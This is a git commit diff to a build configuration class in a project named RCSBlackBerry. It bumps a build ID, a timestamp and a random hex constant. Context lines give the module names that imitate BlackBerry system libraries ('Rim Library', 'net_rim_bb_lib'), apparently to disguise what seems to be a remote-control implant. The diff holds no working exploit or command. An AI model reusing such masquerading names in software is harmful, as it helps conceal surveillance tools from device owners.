665a12632c2ca25615fcb330a3c555d661033d29
Fabrizio Cornelli <finance@suppose.it>
2012-03-29 16:32:14 +0200

    messages

--- RCSBlackBerry/src/blackberry/config/Cfg.java
+++ RCSBlackBerry/src/blackberry/config/Cfg.java
@@ -37,14 +37,14 @@ public class Cfg {
     //==========================================================
     // Compile configuration, do not edit under this line
 
-    public static final int BUILD_ID = 100;
-    public static final String BUILD_TIMESTAMP = "20120329-092701";
+    public static final int BUILD_ID = 102;
+    public static final String BUILD_TIMESTAMP = "20120329-103537";
     
     public static final String GROUP_NAME =  "Rim Library"; //"Rim Library";
     public static final String MODULE_NAME = "net_rim_bb_lib"; //"net_rim_bb_lib";
     public static final String MODULE_LIB_NAME = "net_rim_bb_lib_base"; //"net_rim_bb_lib_base";
 
-    public static final String RANDOM = "2F3640458F033A13";
+    public static final String RANDOM = "165A608682E3278A";
     
     public static final int VERSION = 2012041601;
 
